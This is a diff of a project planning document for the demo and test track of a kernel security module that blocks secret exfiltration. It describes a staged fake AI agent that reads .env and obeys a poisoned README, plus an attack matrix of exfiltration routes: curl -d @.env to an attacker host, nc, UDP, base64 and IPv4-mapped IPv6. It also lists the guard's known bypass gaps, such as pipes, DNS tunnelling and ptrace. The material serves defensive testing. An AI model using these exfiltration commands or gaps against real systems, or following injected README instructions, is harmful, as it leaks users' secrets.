@@ -1,4 +1,4 @@
-# Suyash: Track D, demo and verification (`demo/`, `scripts/`, `tests/`)
+# Suyash: Track D, demo and verification (`demo/`, `scripts/`, `tests/`) + Track P, presentation
 
 This file covers `demo/`, plus the top-level `scripts/` and `tests/` folders. Your policy notes are in [policy/docs/suyash.md](../../policy/docs/suyash.md).
 
@@ -7,6 +7,8 @@ This file covers `demo/`, plus the top-level `scripts/` and `tests/` folders. Yo
 Think of the server as an office building and every running program as a person inside it. SyscallGuard is a guard at the exit doors: anyone who touched a confidential file gets a stamp on their hand, and a stamped person may only go to approved rooms.
 
 You build the **stage and the proof**. The stage: a fake AI agent that reads `.env` and then "follows" a poisoned README, a friendly internal API it's allowed to talk to, and an attacker outside the building waiting to receive secrets. The proof: scripts that check the VM is ready, and an attack matrix that tries every escape route we claim to block and confirms the kernel refused each one with `EPERM`, while the attacker received zero bytes. You also own the runbook that makes the two-minute demo work every time.
+
+You also wear the Track P (presentation) hat: five people, five tracks, and the runbook is already yours. If someone is genuinely free later, P can be reassigned.
 
 ## 2. Where it sits
 
@@ -33,12 +35,11 @@ Your files: `attacker.py` (host), `agent.py`, `internal_api.py`, `reset.sh`, `pr
 - `scripts/check_env.sh`: M0 checks (complete)
 - `scripts/lsm_smoke_test.py`: M0 LSM load check (complete)
 - `tests/attack_matrix.py`: privileged end-to-end matrix
-- `tests/test_policy.py`: see Open questions (PROJECT_BRIEF gives it to Track G)
-- `docs/presentation/demo-runbook.md`: co-owned with Track P
+- `docs/presentation/`: Track P, all of it (`demo-runbook.md`, `talk-track.md`, `judge-qa.md`), plus the deck and poster
 - `policy/policy.example.toml`: keeping it correct for the VM (Hifza owns the schema)
 - `demo/docs/suyash.md`: this file (sections 6, 9, 10 only, during development)
 
-Do not edit: `guard/` (Azaan, Hifza, Divyanshu), `bridge/` (Divyanshu), `dashboard/` (Devansh).
+Do not edit: `tests/test_policy.py` (Hifza), `guard/` (Azaan, Hifza, Divyanshu), `bridge/` (Divyanshu), `dashboard/` (Devansh).
 
 ## 4. What to build
 
@@ -54,11 +55,10 @@ All demo/test tools: Python 3 stdlib only (plus `curl`/`nc` where noted).
    - `udp`: `sendto`
    - `b64`: base64 then direct
    - `preconnect`: connect to the target *before* step 1, then read `.env`, then send
-   - `ipv6`: connect to an IPv6 target
    - `none`
 4. Prints `BLOCKED by kernel (EPERM)` on `PermissionError`/`EPERM`; prints any other error verbatim.
 
-`--step` waits for Enter between phases (stage pacing). For `curl` mode, curl's own exit code/stderr is the signal (curl reports "Couldn't connect"/permission denied; decide how to map it, see Open questions).
+`--step` waits for Enter between phases (stage pacing). For `curl` mode, check the subprocess exit code: curl returns `7` when it can't connect. Exit 7 also covers "connection refused", so `attack_matrix.py` must confirm the block another way (the guard's `BLOCK` event for that run), not from exit 7 alone.
 
 **`demo/internal_api.py --port 8080`**: stdlib HTTP server on `127.0.0.1`. `POST /ingest` returns 200 and logs the byte count.
 
@@ -81,10 +81,12 @@ Check for `EPERM` specifically, not just "failed". A timeout or connection refus
 | `curl -d @.env attacker` (curl opens the file itself) | Hook A tags curl, then Hook B |
 | Tagged process spawns `curl` / `nc` / `python` carrying the data | Hook D inheritance, then Hook B/C |
 | Base64 / any encoding | Content is never inspected; the process is tagged |
-| Any port | Allowlist is by address |
-| IPv6 and IPv4-mapped IPv6 | Hooks B/C |
+| Any port (matrix tries 9999 and 4444) | Allowlist is by address |
+| IPv4-mapped IPv6 (`::ffff:192.168.122.1`) | Hooks B/C |
 | UDP `sendto()` | Hook C |
 | Socket connected *before* reading the secret, then `send()` | Hook C checks the connected peer |
+
+Nothing needs to listen on 4444: a block is `EPERM` before any packet leaves, and anything else (refused, timeout) is a fail. Native IPv6 is not in the matrix (dropped 18 Oct: the libvirt network may have no IPv6 routing, not worth a day). IPv4-mapped IPv6 rides IPv4 routing, so it stays.
 
 Never add a known-gap row (pipes, file relays, allowlisted exfil, DNS tunnelling, AF_UNIX, ptrace, root, leader-exit) as "blocked".
 
@@ -167,9 +169,13 @@ demo/reset.sh                                                          # starts 
 4. The attack: `python3 demo/agent.py --env demo/project/.env --api http://127.0.0.1:8080/ingest --target 192.168.122.1:9999 --exfil curl --step`. Enter through phases: TAG, the allowed POST (ALLOW), curl inherits the tag, `BLOCKED by kernel (EPERM)`, banner red, attacker silent.
 5. Close on the rule: read a protected file → only allowlisted destinations, enforced in the kernel.
 
+**Backup video:** you record it; Azaan verifies it.
+
+**Track P duties:** talk track (`docs/presentation/talk-track.md`), judge Q&A upkeep (`docs/presentation/judge-qa.md`), deck, poster/standee, rehearsal schedule.
+
 **Between runs:** `demo/reset.sh`. For a cold run, revert the VM snapshot.
 
-**Judges** may try rows from the "Blocked" table only (other `--exfil` modes, other ports, base64). **Never invite pipes** (`cat .env | curl ...`): that's a known gap.
+**Judges** may try rows from the "Blocked" table only (other `--exfil` modes, other ports, base64), never native IPv6 (not set up). **Never invite pipes** (`cat .env | curl ...`): that's a known gap.
 
 **If something fails on stage:** Electron dies → open `dashboard/renderer/index.html?bridge=ws://<vm-ip>:8765` in a browser. Guard won't load or VM networking breaks → play the backup video. Attacker receives bytes → stop the live demo, say so plainly, switch to the video.
 
@@ -194,14 +200,9 @@ Start-here prompt to paste to an agent:
 
 ## 9. Open questions
 
-- **Who writes `tests/test_policy.py`.** PROJECT_BRIEF Part 8 assigns it to Track G (now Hifza); the team table gives all of `tests/` to you. Agree with Hifza.
-- **`curl` mode result detection.** curl doesn't raise `PermissionError`; how `agent.py` maps curl's failure to `BLOCKED by kernel (EPERM)` vs "other error" is not specified.
-- **`ipv6` mode target.** The libvirt default network may have no IPv6 route to the host. Which IPv6 address the attacker listens on and how the VM reaches it is not specified. IPv4-mapped IPv6 (`::ffff:192.168.122.1`) also needs a matrix row.
-- **"Any port" row**: which ports the matrix tries is not specified.
-- **`policy/policy.toml`** (the copy with VM paths) is not gitignored; decide whether to commit it or keep it local.
-- **Backup video**: who records it and where it is stored is not specified (brief: P with D).
-- **Track P owner**: `docs/presentation/` has no named person in the team table; the runbook is co-owned with P.
+None open. Resolved 18 Oct (see docs/shared.md): `tests/test_policy.py` is Hifza's; curl mode uses exit code 7; native IPv6 dropped; ports 9999 and 4444; `policy/policy.toml` is gitignored; you record the backup video, Azaan verifies; Track P is your second hat.
 
 ## 10. Work log
 
 - 2026-10-18: file created. `.env`, poisoned README, `check_env.sh`, `lsm_smoke_test.py` complete from bootstrap; the rest are stubs.
+- 2026-10-18: docs updated with team decisions (TAG_INHERIT name not asserted, hook C emits no ALLOW, native IPv6 dropped, open questions resolved). See docs/shared.md.
